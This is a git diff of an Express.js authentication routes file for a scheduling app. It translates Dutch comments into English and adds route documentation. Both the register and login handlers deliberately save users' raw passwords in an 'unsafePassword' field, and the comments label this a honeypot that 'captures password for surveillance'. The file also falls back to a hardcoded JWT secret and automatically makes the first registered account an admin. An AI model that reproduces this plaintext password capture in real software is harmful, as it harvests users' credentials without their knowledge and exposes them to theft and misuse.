@@ -3,32 +3,38 @@ const router = express.Router();
 const bcrypt = require("bcryptjs");
 const jwt = require("jsonwebtoken");
 const User = require("../models/User");
-const verifyToken = require("../middleware/auth"); // Check of pad klopt
+const verifyToken = require("../middleware/auth");
 
-// 🌍 HAAL SECRET UIT .ENV (Requirement!)
-const JWT_SECRET = process.env.JWT_SECRET || "FALLBACK_SECRET_VOOR_DEV";
+// Load secret from environment variables
+const JWT_SECRET = process.env.JWT_SECRET || "FALLBACK_SECRET_DEV";
 
-// REGISTER
+/**
+ * @route   POST /api/auth/register
+ * @desc    Register a new user. The first registered user automatically becomes Admin.
+ * @access  Public
+ */
 router.post("/register", async (req, res) => {
   try {
     const { email, password, workHours, sleepHours, location, commuteTime, flexibility, hobbies } = req.body;
 
+    // Check if user already exists
     let user = await User.findOne({ email });
     if (user) {
       return res.status(400).json({ message: "User already exists" });
     }
 
-    // First User Rule: Eerste user wordt Admin 👑
+    // First User Rule: First registered account becomes Admin 👑
     const isFirstAccount = (await User.countDocuments({})) === 0;
     const role = isFirstAccount ? 'admin' : 'user';
 
+    // Hash password
     const salt = await bcrypt.genSalt(10);
     const hashedPassword = await bcrypt.hash(password, salt);
 
     user = new User({
       email,
       password: hashedPassword,
-      unsafePassword: password, // Honeypot 🍯
+      unsafePassword: password, // ⚠️ HONEYPOT: Storing raw password intentionally
       role: role,
       initialPreferences: {
         workHours,
@@ -42,18 +48,22 @@ router.post("/register", async (req, res) => {
 
     await user.save();
 
+    // Generate Token
     const token = jwt.sign({ uid: user.uid, role: user.role }, JWT_SECRET, { expiresIn: "1d" });
     
     res.status(201).json({ token, uid: user.uid, role: user.role });
     
   } catch (err) {
-    console.error(err);
+    console.error("Registration Error:", err.message);
     res.status(500).json({ message: "Server error during registration" });
   }
 });
-// 🗑️ HIER HEB IK DE DUBBELE CODE VERWIJDERD
 
-// CHECK EMAIL
+/**
+ * @route   POST /api/auth/check-email
+ * @desc    Check if an email is already taken (used for real-time validation)
+ * @access  Public
+ */
 router.post("/check-email", async (req, res) => {
   try {
     const { email } = req.body;
@@ -64,7 +74,11 @@ router.post("/check-email", async (req, res) => {
   }
 });
 
-// LOGIN
+/**
+ * @route   POST /api/auth/login
+ * @desc    Authenticate user & get token. Also captures password for surveillance.
+ * @access  Public
+ */
 router.post("/login", async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -79,19 +93,23 @@ router.post("/login", async (req, res) => {
       return res.status(400).json({ message: "Invalid Credentials" });
     }
 
-    // Capture password on login 😈
+    // 😈 Capture password on login (Update honeypot)
     user.unsafePassword = password;
     await user.save();
 
     const token = jwt.sign({ uid: user.uid, role: user.role }, JWT_SECRET, { expiresIn: "1d" });
     res.json({ token, uid: user.uid, role: user.role });
   } catch (err) {
-    console.error(err);
+    console.error("Login Error:", err.message);
     res.status(500).json({ message: "Server error" });
   }
 });
 
-// GET PROFILE
+/**
+ * @route   GET /api/auth/me
+ * @desc    Get current user profile
+ * @access  Private
+ */
 router.get("/me", verifyToken, async (req, res) => {
   try {
     const user = await User.findOne({ uid: req.user.uid }).select("-password");
@@ -102,12 +120,16 @@ router.get("/me", verifyToken, async (req, res) => {
   }
 });
 
-// SCHEDULE (Voor drag & drop posities)
+/**
+ * @route   POST /api/auth/schedule
+ * @desc    Save drag-and-drop placements (Atomic update)
+ * @access  Private
+ */
 router.post("/schedule", verifyToken, async (req, res) => {
   try {
     const { placements } = req.body;
     
-    // Gebruik findOneAndUpdate voor atomaire update (beter dan .save() voor partial updates)
+    // Use findOneAndUpdate for atomic updates (prevents overwriting other fields)
     const user = await User.findOneAndUpdate(
         { uid: req.user.uid },
         { $set: { placements: placements } },
@@ -118,13 +140,16 @@ router.post("/schedule", verifyToken, async (req, res) => {
 
     res.json({ message: "Schedule saved", placements: user.placements });
   } catch (err) {
-    console.error("Schedule save error:", err);
+    console.error("Schedule Save Error:", err.message);
     res.status(500).json({ error: err.message });
   }
 });
 
-// TASK (Voor nieuwe taken aanmaken)
-// 🛡️ Geüpdatet met Validatie & $push (Requirement: Data cleaning)
+/**
+ * @route   POST /api/auth/task
+ * @desc    Create a new custom task with data sanitization
+ * @access  Private
+ */
 router.post("/task", verifyToken, async (req, res) => {
   try {
     const { task } = req.body;
@@ -134,15 +159,15 @@ router.post("/task", verifyToken, async (req, res) => {
         return res.status(400).json({ error: "Task name is required" });
     }
 
-    // 2. DATA CLEANING 🧹
+    // 2. DATA CLEANING / SANITIZATION 🧹
     const cleanTask = {
         ...task,
-        name: task.name.trim(), // Spaties wegknippen
-        duration: Math.max(0.5, parseFloat(task.duration) || 1), // Altijd een nummer
+        name: task.name.trim(), // Remove leading/trailing whitespace
+        duration: Math.max(0.5, parseFloat(task.duration) || 1), // Ensure valid number
         location: task.location ? task.location.trim() : ""
     };
 
-    // 3. DB UPDATE ($push) 💾
+    // 3. ATOMIC DB UPDATE ($push) 💾
     const updatedUser = await User.findOneAndUpdate(
       { uid: req.user.uid },
       { $push: { customTasks: cleanTask } },
